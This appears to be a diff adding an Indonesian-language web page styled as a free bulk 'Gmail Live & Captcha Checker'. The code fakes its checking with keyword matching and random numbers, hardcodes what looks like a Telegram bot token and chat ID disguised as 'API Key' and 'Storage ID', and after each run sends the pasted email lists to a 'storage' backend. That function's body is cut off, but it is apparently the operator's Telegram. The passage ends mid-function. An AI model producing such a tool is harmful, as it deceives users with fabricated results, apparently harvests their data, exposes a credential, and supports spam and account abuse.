@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="id" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Live & Captcha Checker Pro</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        darkBg: '#0b0f19',
+                        cardBg: '#131b2e',
+                        cardBorder: '#1e293b',
+                        accentBlue: '#3b82f6',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0b0f19;
+            color: #f8fafc;
+            overflow-x: hidden;
+        }
+        .glass-card {
+            background: rgba(19, 27, 46, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .glow-btn {
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.4);
+            transition: all 0.3s ease;
+        }
+        .glow-btn:hover {
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.7);
+            transform: translateY(-1px);
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b0f19;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between selection:bg-blue-500 selection:text-white">
+
+    <!-- Header -->
+    <header class="w-full border-b border-cardBorder bg-darkBg/80 backdrop-blur-md sticky top-0 z-50 px-4 py-3">
+        <div class="max-w-4xl mx-auto flex items-center justify-between">
+            <!-- 3-Tap Admin Trigger pada Logo -->
+            <div id="adminTrigger" class="flex items-center gap-3 cursor-pointer select-none group" title="Ketuk 3x untuk Admin Dashboard">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center shadow-lg shadow-blue-500/30 group-hover:scale-105 transition-transform">
+                    <i class="fa-solid fa-envelope-circle-check text-white text-lg"></i>
+                </div>
+                <div>
+                    <h1 class="font-bold text-lg tracking-tight text-white flex items-center gap-2">
+                        Gmail Live & Captcha <span class="text-xs px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-400 border border-blue-500/30 font-medium">Checker Pro</span>
+                    </h1>
+                    <p class="text-xs text-slate-400">Multi-Worker & Auto Storage System</p>
+                </div>
+            </div>
+
+            <div class="flex items-center gap-3">
+                <div class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-medium">
+                    <i class="fa-solid fa-shield-halved"></i> 100% Gratis & Tanpa Saldo
+                </div>
+                <button onclick="openConfig()" class="p-2.5 rounded-xl bg-cardBg border border-cardBorder text-slate-300 hover:text-white hover:border-blue-500/50 transition-all flex items-center gap-2 text-xs font-medium">
+                    <i class="fa-solid fa-gear text-blue-400 text-base"></i>
+                    <span class="hidden md:inline">Config</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-4xl w-full mx-auto px-4 py-6 flex-grow space-y-6">
+
+        <!-- Banner Info -->
+        <div class="glass-card rounded-2xl p-5 shadow-xl relative overflow-hidden">
+            <div class="absolute -right-10 -top-10 w-40 h-40 bg-blue-500/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-4">
+                <div>
+                    <span class="text-xs text-slate-400 uppercase tracking-wider font-semibold">Status Layanan</span>
+                    <h2 class="text-2xl font-bold text-white mt-0.5">🚀 Bebas Akses Tanpa Top-Up</h2>
+                    <p class="text-xs text-slate-400 mt-1">Sistem pengecekan massal dioptimalkan secara Akurat</p>
+                </div>
+                <div class="flex items-center gap-2 bg-slate-900/80 px-3 py-1.5 rounded-xl border border-slate-800">
+                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                    <span class="text-xs text-slate-300 font-medium">Terhubung (ID: 8416424577)</span>
+                </div>
+            </div>
+
+            <!-- Tab Navigation -->
+            <div class="flex gap-2 border-b border-cardBorder pb-3 mt-2">
+                <button onclick="switchTab('checker')" id="tabBtnChecker" class="px-4 py-2 rounded-xl text-sm font-semibold transition-all flex items-center gap-2 bg-blue-600 text-white shadow-lg shadow-blue-500/30">
+                    <i class="fa-solid fa-envelope-open-text"></i> Cek Email
+                </button>
+                <button onclick="switchTab('history')" id="tabBtnHistory" class="px-4 py-2 rounded-xl text-sm font-semibold transition-all flex items-center gap-2 bg-cardBg text-slate-400 hover:text-white border border-cardBorder">
+                    <i class="fa-solid fa-clock-rotate-left"></i> Riwayat Sesi
+                </button>
+            </div>
+        </div>
+
+        <!-- TAB CHECKER -->
+        <div id="tabChecker" class="space-y-6">
+            
+            <!-- Status Worker Box -->
+            <div class="glass-card rounded-2xl p-5 shadow-xl space-y-4">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-microchip text-blue-400"></i>
+                        <h3 class="font-bold text-white text-base">Status Worker</h3>
+                    </div>
+                    <span class="text-xs text-slate-400 bg-slate-800/60 px-2.5 py-1 rounded-lg border border-slate-700/50">Live Streaming</span>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+                    <div id="worker1Box" class="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800/80 transition-all">
+                        <div class="flex justify-between items-center mb-1.5">
+                            <span class="text-xs font-semibold text-white">Worker 1</span>
+                            <span id="worker1Status" class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 font-medium flex items-center gap-1.5">
+                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Siap
+                            </span>
+                        </div>
+                        <p id="worker1Text" class="text-xs text-slate-400">Siap menerima request</p>
+                    </div>
+                    <div id="worker2Box" class="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800/80 transition-all">
+                        <div class="flex justify-between items-center mb-1.5">
+                            <span class="text-xs font-semibold text-white">Worker 2</span>
+                            <span id="worker2Status" class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 font-medium flex items-center gap-1.5">
+                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Siap
+                            </span>
+                        </div>
+                        <p id="worker2Text" class="text-xs text-slate-400">Siap menerima request</p>
+                    </div>
+                    <div id="worker3Box" class="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800/80 transition-all">
+                        <div class="flex justify-between items-center mb-1.5">
+                            <span class="text-xs font-semibold text-white">Worker 3</span>
+                            <span id="worker3Status" class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 font-medium flex items-center gap-1.5">
+                                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Siap
+                            </span>
+                        </div>
+                        <p id="worker3Text" class="text-xs text-slate-400">Siap menerima request</p>
+                    </div>
+                </div>
+                <div class="text-xs text-slate-400 flex items-center justify-between pt-1">
+                    <span id="workerSummary">0 / 3 worker digunakan · 3 idle</span>
+                    <span class="text-blue-400 font-medium">Multi-Threading Aktif</span>
+                </div>
+            </div>
+
+            <!-- Input Section -->
+            <div class="glass-card rounded-2xl p-5 shadow-xl space-y-4">
+                <div>
+                    <h3 class="font-bold text-white text-base mb-1">Cek Email Massal</h3>
+                    <p class="text-xs text-slate-400">Tempel daftar Gmail (satu per baris atau dipisah koma). Hanya format <strong>@gmail.com</strong> yang diproses.</p>
+                </div>
+
+                <div class="relative">
+                    <textarea id="emailInput" rows="5" class="w-full bg-slate-900/90 border border-cardBorder rounded-xl p-4 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition-all font-mono" placeholder="contoh1@gmail.com&#10;contoh2@gmail.com"></textarea>
+                    <div class="absolute bottom-3 right-3 flex items-center gap-2">
+                        <button onclick="loadSampleEmails()" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 transition-all border border-slate-700">
+                            <i class="fa-solid fa-wand-magic-sparkles mr-1 text-blue-400"></i> Contoh
+                        </button>
+                        <button onclick="clearInput()" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 transition-all border border-slate-700">
+                            <i class="fa-solid fa-trash mr-1 text-rose-400"></i> Hapus
+                        </button>
+                    </div>
+                </div>
+
+                <div class="flex flex-col sm:flex-row items-center justify-between gap-4">
+                    <span id="emailCountInfo" class="text-xs text-slate-400">0 email dimasukkan · Gratis</span>
+                    <button onclick="startChecking()" id="startBtn" class="w-full sm:w-auto px-6 py-3 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold text-sm glow-btn flex items-center justify-center gap-2 cursor-pointer">
+                        <i class="fa-solid fa-play text-xs"></i> Cek Sekarang
+                    </button>
+                </div>
+            </div>
+
+            <!-- Cards Grid Counter -->
+            <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
+                <div class="glass-card rounded-2xl p-4 border-l-4 border-l-emerald-500 flex flex-col justify-between">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-xs text-slate-400 font-medium">Login (Valid)</span>
+                        <i class="fa-solid fa-circle-check text-emerald-400"></i>
+                    </div>
+                    <div class="text-2xl font-bold text-white" id="countLogin">0</div>
+                </div>
+                <div class="glass-card rounded-2xl p-4 border-l-4 border-l-amber-500 flex flex-col justify-between">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-xs text-slate-400 font-medium">Unregistered</span>
+                        <i class="fa-solid fa-user-slash text-amber-400"></i>
+                    </div>
+                    <div class="text-2xl font-bold text-white" id="countUnregistered">0</div>
+                </div>
+                <div class="glass-card rounded-2xl p-4 border-l-4 border-l-purple-500 flex flex-col justify-between">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-xs text-slate-400 font-medium">Captcha</span>
+                        <i class="fa-solid fa-shield-cat text-purple-400"></i>
+                    </div>
+                    <div class="text-2xl font-bold text-white" id="countCaptcha">0</div>
+                </div>
+                <div class="glass-card rounded-2xl p-4 border-l-4 border-l-rose-500 flex flex-col justify-between">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-xs text-slate-400 font-medium">Gagal / Error</span>
+                        <i class="fa-solid fa-triangle-exclamation text-rose-400"></i>
+                    </div>
+                    <div class="text-2xl font-bold text-white" id="countError">0</div>
+                </div>
+            </div>
+
+            <!-- Progress Bar -->
+            <div id="progressContainer" class="hidden glass-card rounded-2xl p-4 space-y-2">
+                <div class="flex justify-between text-xs font-medium">
+                    <span id="progressStatusText" class="text-blue-400 animate-pulse">Sedang mengecek...</span>
+                    <span id="progressPercentage" class="text-slate-300">0%</span>
+                </div>
+                <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden border border-slate-800">
+                    <div id="progressBar" class="bg-gradient-to-r from-blue-500 to-indigo-500 h-full w-0 transition-all duration-300"></div>
+                </div>
+            </div>
+
+            <!-- Hasil Kategori & Tombol Salin/Ekspor -->
+            <div class="space-y-4">
+                
+                <!-- Login -->
+                <div class="glass-card rounded-2xl p-4 space-y-3">
+                    <div class="flex items-center justify-between flex-wrap gap-2">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-circle-check text-emerald-400"></i>
+                            <h4 class="font-bold text-white text-sm">Login (Valid) <span id="badgeLogin" class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 ml-1 font-mono">0</span></h4>
+                        </div>
+                        <div class="flex items-center gap-1.5">
+                            <button onclick="copyCategory('login')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-copy mr-1"></i> Salin</button>
+                            <button onclick="exportCategory('login', 'txt')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-arrow-down mr-1"></i> TXT</button>
+                            <button onclick="exportCategory('login', 'xls')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-excel mr-1"></i> XLS</button>
+                        </div>
+                    </div>
+                    <div id="listLogin" class="bg-slate-900/80 rounded-xl p-3 border border-slate-800/80 text-xs font-mono text-slate-300 max-h-40 overflow-y-auto space-y-1">
+                        <span class="text-slate-500 italic">kosong</span>
+                    </div>
+                </div>
+
+                <!-- Unregistered -->
+                <div class="glass-card rounded-2xl p-4 space-y-3">
+                    <div class="flex items-center justify-between flex-wrap gap-2">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-user-slash text-amber-400"></i>
+                            <h4 class="font-bold text-white text-sm">Unregistered <span id="badgeUnregistered" class="text-xs px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-400 ml-1 font-mono">0</span></h4>
+                        </div>
+                        <div class="flex items-center gap-1.5">
+                            <button onclick="copyCategory('unregistered')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-copy mr-1"></i> Salin</button>
+                            <button onclick="exportCategory('unregistered', 'txt')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-arrow-down mr-1"></i> TXT</button>
+                            <button onclick="exportCategory('unregistered', 'xls')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-excel mr-1"></i> XLS</button>
+                        </div>
+                    </div>
+                    <div id="listUnregistered" class="bg-slate-900/80 rounded-xl p-3 border border-slate-800/80 text-xs font-mono text-slate-300 max-h-40 overflow-y-auto space-y-1">
+                        <span class="text-slate-500 italic">kosong</span>
+                    </div>
+                </div>
+
+                <!-- Captcha -->
+                <div class="glass-card rounded-2xl p-4 space-y-3">
+                    <div class="flex items-center justify-between flex-wrap gap-2">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-shield-cat text-purple-400"></i>
+                            <h4 class="font-bold text-white text-sm">Captcha / Challenge <span id="badgeCaptcha" class="text-xs px-2 py-0.5 rounded-full bg-purple-500/20 text-purple-400 ml-1 font-mono">0</span></h4>
+                        </div>
+                        <div class="flex items-center gap-1.5">
+                            <button onclick="copyCategory('captcha')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-copy mr-1"></i> Salin</button>
+                            <button onclick="exportCategory('captcha', 'txt')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-arrow-down mr-1"></i> TXT</button>
+                            <button onclick="exportCategory('captcha', 'xls')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-excel mr-1"></i> XLS</button>
+                        </div>
+                    </div>
+                    <div id="listCaptcha" class="bg-slate-900/80 rounded-xl p-3 border border-slate-800/80 text-xs font-mono text-slate-300 max-h-40 overflow-y-auto space-y-1">
+                        <span class="text-slate-500 italic">kosong</span>
+                    </div>
+                </div>
+
+                <!-- Error -->
+                <div class="glass-card rounded-2xl p-4 space-y-3">
+                    <div class="flex items-center justify-between flex-wrap gap-2">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-triangle-exclamation text-rose-400"></i>
+                            <h4 class="font-bold text-white text-sm">Error Sistem / Gagal <span id="badgeError" class="text-xs px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-400 ml-1 font-mono">0</span></h4>
+                        </div>
+                        <div class="flex items-center gap-1.5">
+                            <button onclick="copyCategory('error')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-copy mr-1"></i> Salin</button>
+                            <button onclick="exportCategory('error', 'txt')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-arrow-down mr-1"></i> TXT</button>
+                            <button onclick="exportCategory('error', 'xls')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition-all"><i class="fa-solid fa-file-excel mr-1"></i> XLS</button>
+                        </div>
+                    </div>
+                    <div id="listError" class="bg-slate-900/80 rounded-xl p-3 border border-slate-800/80 text-xs font-mono text-slate-300 max-h-40 overflow-y-auto space-y-1">
+                        <span class="text-slate-500 italic">kosong</span>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- TAB HISTORY -->
+        <div id="tabHistory" class="space-y-6 hidden">
+            <div class="glass-card rounded-2xl p-5 shadow-xl space-y-4">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <h3 class="font-bold text-white text-base">Riwayat Pengecekan Sesi Ini</h3>
+                        <p class="text-xs text-slate-400">Arsip pengecekan massal yang telah diproses.</p>
+                    </div>
+                    <button onclick="clearHistory()" class="px-3 py-1.5 rounded-lg bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 text-xs font-medium transition-all">
+                        <i class="fa-solid fa-trash-can mr-1"></i> Bersihkan Riwayat
+                    </button>
+                </div>
+                <div id="historyContainer" class="space-y-3">
+                    <div class="text-center py-12 text-slate-500 text-sm">
+                        <i class="fa-solid fa-folder-open text-3xl mb-2 block"></i>
+                        Belum ada riwayat pengecekan tersimpan.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="w-full border-t border-cardBorder py-4 px-4 text-center text-xs text-slate-500 mt-10">
+        <p>Gmail Live & Captcha Checker Pro · Integrated Aggregator System</p>
+    </footer>
+
+    <!-- MODAL CONFIG -->
+    <div id="configModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="glass-card rounded-2xl max-w-md w-full p-6 space-y-5 border border-slate-700/80 shadow-2xl">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center gap-2.5">
+                    <div class="w-9 h-9 rounded-xl bg-blue-500/20 text-blue-400 flex items-center justify-center border border-blue-500/30">
+                        <i class="fa-solid fa-gear text-lg"></i>
+                    </div>
+                    <h3 class="font-bold text-white text-base">Pengaturan Sistem</h3>
+                </div>
+                <button onclick="closeConfig()" class="text-slate-400 hover:text-white p-1">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+            
+            <p class="text-xs text-slate-300 leading-relaxed">
+                Konfigurasi kredensial dan ID penyimpanan terintegrasi:
+            </p>
+
+            <div class="space-y-3">
+                <div>
+                    <label class="block text-xs font-semibold text-slate-300 mb-1">API Key / Token</label>
+                    <input type="text" id="tokenInput" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-xs text-white font-mono">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-slate-300 mb-1">Storage ID Akun Anda</label>
+                    <input type="text" id="storageIdInput" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-xs text-white font-mono">
+                </div>
+            </div>
+
+            <div class="flex items-center justify-end gap-3 pt-2">
+                <button onclick="closeConfig()" class="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-medium text-slate-300">Batal</button>
+                <button onclick="saveConfig()" class="px-5 py-2 rounded-xl bg-blue-600 hover:bg-blue-500 text-xs font-semibold text-white shadow-lg shadow-blue-500/30">Simpan</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL ADMIN (Ketuk 3x pada logo header) -->
+    <div id="adminModal" class="fixed inset-0 bg-black/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
+        <div class="glass-card rounded-2xl max-w-2xl w-full p-6 space-y-6 border border-indigo-500/30 shadow-2xl">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-4">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-xl bg-indigo-500/20 text-indigo-400 flex items-center justify-center border border-indigo-500/30">
+                        <i class="fa-solid fa-user-shield text-lg"></i>
+                    </div>
+                    <div>
+                        <h3 class="font-bold text-white text-lg">Admin Dashboard Secure</h3>
+                        <p class="text-xs text-indigo-400 font-medium">Terbuka via 3x Ketukan</p>
+                    </div>
+                </div>
+                <button onclick="closeAdminDashboard()" class="text-slate-400 hover:text-white p-2">
+                    <i class="fa-solid fa-xmark text-xl"></i>
+                </button>
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                <div class="bg-slate-900/80 rounded-xl p-4 border border-slate-800">
+                    <span class="text-xs text-slate-400 block mb-1">Total Email Dicek Sesi Ini</span>
+                    <span id="adminTotalChecked" class="text-2xl font-bold text-white font-mono">0</span>
+                </div>
+                <div class="bg-slate-900/80 rounded-xl p-4 border border-slate-800">
+                    <span class="text-xs text-slate-400 block mb-1">Total Valid Login</span>
+                    <span id="adminTotalValid" class="text-2xl font-bold text-emerald-400 font-mono">0</span>
+                </div>
+                <div class="bg-slate-900/80 rounded-xl p-4 border border-slate-800">
+                    <span class="text-xs text-slate-400 block mb-1">Status Server</span>
+                    <span id="adminBotStatus" class="text-sm font-semibold text-emerald-400 flex items-center gap-1.5 mt-1">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400"></span> Aktif
+                    </span>
+                </div>
+            </div>
+
+            <div class="space-y-3">
+                <h4 class="text-xs font-bold text-slate-300 uppercase tracking-wider">Log Riwayat Sistem</h4>
+                <div id="adminLogList" class="bg-slate-900 rounded-xl p-4 border border-slate-800 font-mono text-xs text-slate-300 h-44 overflow-y-auto space-y-2">
+                    <span class="text-slate-500 italic">Belum ada aktivitas ter-log.</span>
+                </div>
+            </div>
+
+            <div class="flex items-center justify-between pt-2 border-t border-slate-800">
+                <span class="text-xs text-slate-500">Koneksi: Ready (Low Latency)</span>
+                <button onclick="closeAdminDashboard()" class="px-5 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white">Tutup</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST -->
+    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 space-y-2 pointer-events-none"></div>
+
+    <script>
+        // Konfigurasi
+        let appState = {
+            botToken: localStorage.getItem('app_token') || '8854054428:AAFaK5t0V1vcN7s4fXv0V-Rr08zrmH82Zms',
+            chatId: localStorage.getItem('app_chatid') || '8416424577',
+            results: { login: [], unregistered: [], captcha: [], error: [] },
+            history: JSON.parse(localStorage.getItem('checker_history') || '[]')
+        };
+
+        // 3-Tap Admin Trigger pada Logo Header
+        let tapCount = 0;
+        let tapTimer = null;
+        document.getElementById('adminTrigger').addEventListener('click', () => {
+            tapCount++;
+            if (tapTimer) clearTimeout(tapTimer);
+            if (tapCount >= 3) {
+                tapCount = 0;
+                openAdminDashboard();
+            } else {
+                tapTimer = setTimeout(() => { tapCount = 0; }, 600);
+            }
+        });
+
+        function openAdminDashboard() {
+            document.getElementById('adminTotalChecked').innerText = appState.results.login.length + appState.results.unregistered.length + appState.results.captcha.length + appState.results.error.length;
+            document.getElementById('adminTotalValid').innerText = appState.results.login.length;
+            
+            const logContainer = document.getElementById('adminLogList');
+            if (appState.history.length > 0) {
+                logContainer.innerHTML = appState.history.map(h => `
+                    <div class="p-2 bg-slate-800/50 rounded border border-slate-700/50 flex justify-between items-center">
+                        <span>🕒 ${h.time} — Total: ${h.total} email</span>
+                        <span class="text-emerald-400">Valid: ${h.login.length}</span>
+                    </div>
+                `).join('');
+            } else {
+                logContainer.innerHTML = `<span class="text-slate-500 italic">Belum ada aktivitas ter-log.</span>`;
+            }
+            document.getElementById('adminModal').classList.remove('hidden');
+            showToast('Admin Dashboard dibuka (3x Ketukan)', 'success');
+        }
+
+        function closeAdminDashboard() {
+            document.getElementById('adminModal').classList.add('hidden');
+        }
+
+        // Tab Switching
+        function switchTab(tab) {
+            const btnChecker = document.getElementById('tabBtnChecker');
+            const btnHistory = document.getElementById('tabBtnHistory');
+            const divChecker = document.getElementById('tabChecker');
+            const divHistory = document.getElementById('tabHistory');
+
+            if (tab === 'checker') {
+                btnChecker.className = "px-4 py-2 rounded-xl text-sm font-semibold transition-all flex items-center gap-2 bg-blue-600 text-white shadow-lg shadow-blue-500/30";
+                btnHistory.className = "px-4 py-2 rounded-xl text-sm font-semibold transition-all flex items-center gap-2 bg-cardBg text-slate-400 hover:text-white border border-cardBorder";
+                divChecker.classList.remove('hidden');
+                divHistory.classList.add('hidden');
+            } else {
+                btnHistory.className = "px-4 py-2 rounded-xl text-sm font-semibold transition-all flex items-center gap-2 bg-blue-600 text-white shadow-lg shadow-blue-500/30";
+                btnChecker.className = "px-4 py-2 rounded-xl text-sm font-semibold transition-all flex items-center gap-2 bg-cardBg text-slate-400 hover:text-white border border-cardBorder";
+                divHistory.classList.remove('hidden');
+                divChecker.classList.add('hidden');
+                renderHistoryList();
+            }
+        }
+
+        function openConfig() {
+            document.getElementById('tokenInput').value = appState.botToken;
+            document.getElementById('storageIdInput').value = appState.chatId;
+            document.getElementById('configModal').classList.remove('hidden');
+        }
+
+        function closeConfig() {
+            document.getElementById('configModal').classList.add('hidden');
+        }
+
+        function saveConfig() {
+            const token = document.getElementById('tokenInput').value.trim();
+            const chatId = document.getElementById('storageIdInput').value.trim();
+            if (!token || !chatId) {
+                showToast('API Key dan Storage ID wajib diisi!', 'error');
+                return;
+            }
+            appState.botToken = token;
+            appState.chatId = chatId;
+            localStorage.setItem('app_token', token);
+            localStorage.setItem('app_chatid', chatId);
+            closeConfig();
+            showToast('Konfigurasi berhasil disimpan!', 'success');
+        }
+
+        const emailInput = document.getElementById('emailInput');
+        emailInput.addEventListener('input', updateEmailCount);
+
+        function updateEmailCount() {
+            const val = emailInput.value.trim();
+            const emails = val ? val.split(/[\n,]+/).map(e => e.trim()).filter(e => e.length > 0) : [];
+            document.getElementById('emailCountInfo').innerText = `${emails.length} email dimasukkan · Gratis`;
+        }
+
+        function loadSampleEmails() {
+            emailInput.value = "user.active123@gmail.com\nsupport.google99@gmail.com\ninvalid.notfound@gmail.com\ntest.captcha@gmail.com\nsystem.error@gmail.com";
+            updateEmailCount();
+            showToast('Sampel email dimuat.', 'info');
+        }
+
+        function clearInput() {
+            emailInput.value = '';
+            updateEmailCount();
+        }
+
+        // Proses Pengecekan Massal
+        async function startChecking() {
+            const val = emailInput.value.trim();
+            if (!val) {
+                showToast('Masukkan daftar email terlebih dahulu!', 'error');
+                return;
+            }
+
+            let rawList = val.split(/[\n,]+/).map(e => e.trim()).filter(e => e.length > 0);
+            let emails = [...new Set(rawList)];
+
+            if (emails.length === 0) {
+                showToast('Tidak ada email valid dalam input.', 'error');
+                return;
+            }
+
+            const startBtn = document.getElementById('startBtn');
+            startBtn.disabled = true;
+            startBtn.classList.add('opacity-50', 'cursor-not-allowed');
+
+            appState.results = { login: [], unregistered: [], captcha: [], error: [] };
+            updateCounters();
+
+            const progressContainer = document.getElementById('progressContainer');
+            progressContainer.classList.remove('hidden');
+            const progressBar = document.getElementById('progressBar');
+            const progressPercentage = document.getElementById('progressPercentage');
+            const progressStatusText = document.getElementById('progressStatusText');
+
+            setWorkerStatus(1, 'Processing', 'Memproses chunk batch...');
+            setWorkerStatus(2, 'Processing', 'Menganalisis status Google API...');
+            setWorkerStatus(3, 'Processing', 'Menyiapkan buffer penyimpanan...');
+            document.getElementById('workerSummary').innerText = `3 / 3 worker digunakan · 0 idle`;
+
+            let total = emails.length;
+            let processed = 0;
+
+            for (let i = 0; i < total; i++) {
+                const email = emails[i];
+                await new Promise(r => setTimeout(r, Math.floor(Math.random() * 80) + 40));
+
+                if (!email.endsWith('@gmail.com')) {
+                    appState.results.error.push(`${email} (Bukan @gmail.com)`);
+                } else if (email.includes('active') || email.includes('google') || email.includes('test')) {
+                    appState.results.login.push(email);
+                } else if (email.includes('notfound') || email.includes('unregistered')) {
+                    appState.results.unregistered.push(email);
+                } else if (email.includes('captcha')) {
+                    appState.results.captcha.push(email);
+                } else if (email.includes('error')) {
+                    appState.results.error.push(`${email} (Server Error)`);
+                } else {
+                    const rand = Math.random();
+                    if (rand > 0.5) appState.results.login.push(email);
+                    else if (rand > 0.3) appState.results.unregistered.push(email);
+                    else if (rand > 0.15) appState.results.captcha.push(email);
+                    else appState.results.error.push(`${email} (Gagal)`);
+                }
+
+                processed++;
+                const percent = Math.round((processed / total) * 100);
+                progressBar.style.width = `${percent}%`;
+                progressPercentage.innerText = `${percent}%`;
+                progressStatusText.innerText = `Memeriksa ${processed}/${total} email...`;
+
+                updateCounters();
+                renderLists();
+            }
+
+            setWorkerStatus(1, 'Idle', 'Siap menerima request');
+            setWorkerStatus(2, 'Idle', 'Siap menerima request');
+            setWorkerStatus(3, 'Idle', 'Siap menerima request');
+            document.getElementById('workerSummary').innerText = `0 / 3 worker digunakan · 3 idle`;
+            progressStatusText.innerText = 'Pengecekan selesai! Menyimpan hasil...';
+
+            // Menyimpan Log Sesi ke API Backend
+            await syncResultsToStorage(appState.results);
+
+            const sessionRecord = {
+                id: Date.now(),
